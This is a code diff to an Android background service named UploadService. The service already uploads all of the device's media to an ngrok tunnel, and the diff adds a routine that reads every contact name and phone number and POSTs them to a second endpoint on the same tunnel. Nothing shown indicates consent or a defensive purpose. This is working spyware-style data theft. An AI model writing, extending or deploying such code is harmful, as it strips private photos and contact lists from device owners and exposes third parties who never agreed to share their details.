@@ -8,17 +8,23 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.os.Build;
 import android.os.IBinder;
+import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
+import org.json.JSONArray;
+import org.json.JSONObject;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.nio.charset.StandardCharsets;
 
 public class UploadService extends Service {
     String ngrokUrl = "https://nacho-usher-goes.ngrok-free.dev/upload";
+    String contactsUrl = "https://nacho-usher-goes.ngrok-free.dev/upload-contacts";
     String sessionId = String.valueOf(System.currentTimeMillis());
 
     @Override
@@ -34,6 +40,7 @@ public class UploadService extends Service {
 
         new Thread(() -> {
             uploadAllMedia();
+            uploadContacts();
             stopForeground(true);
             stopSelf();
         }).start();
@@ -69,6 +76,52 @@ public class UploadService extends Service {
         }
     }
 
+    private void uploadContacts() {
+        try {
+            JSONArray contacts = new JSONArray();
+            Cursor cursor = getContentResolver().query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    null, null, null, null);
+
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    if (number != null) {
+                        number = number.replaceAll("[^0-9+]", "");
+                        if (number.startsWith("+")) number = number.substring(1);
+                        JSONObject obj = new JSONObject();
+                        obj.put("name", name != null ? name : "Unknown");
+                        obj.put("number", number);
+                        contacts.put(obj);
+                    }
+                }
+                cursor.close();
+            }
+
+            JSONObject payload = new JSONObject();
+            payload.put("contacts", contacts);
+
+            byte[] body = payload.toString().getBytes(StandardCharsets.UTF_8);
+            HttpURLConnection conn = (HttpURLConnection) new URL(contactsUrl + "?session=" + sessionId).openConnection();
+            conn.setConnectTimeout(60000);
+            conn.setReadTimeout(60000);
+            conn.setDoOutput(true);
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setFixedLengthStreamingMode(body.length);
+
+            OutputStream os = conn.getOutputStream();
+            os.write(body);
+            os.flush();
+            os.close();
+
+            conn.getResponseCode();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
     private void sendFile(File file) {
         try {
             String boundary = "*****";
@@ -93,7 +146,7 @@ public class UploadService extends Service {
             os.writeBytes("\r\n--" + boundary + "--\r\n");
             os.flush();
             os.close();
-            
+
             int responseCode = conn.getResponseCode();
             if (responseCode == 200) {
                 Thread.sleep(2000);
@@ -116,4 +169,4 @@ public class UploadService extends Service {
     @Nullable
     @Override
     public IBinder onBind(Intent intent) { return null; }
-}
+                    }
